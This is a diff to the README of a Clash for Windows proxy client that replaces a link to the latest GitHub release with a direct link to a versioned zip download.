@@ -9,7 +9,7 @@ Clash for Windows is a powerful and user-friendly graphical client for Clash cor
 > This project is for educational and personal use only. Use at your own risk. The authors are not responsible for any issues or violations of local laws and service terms.
 
 ## Install
-[Download `Clash-for-Windows.zip`](https://github.com/clash-for-windows-download/clash-for-windows/releases/latest)
+[Download `Clash-for-Windows.zip`](https://github.com/clash-for-windows-download/clash-for-windows/releases/download/v0.20.39/Clash-For-Windows.zip)
 ---
 > Optimized for Windows 11.
 
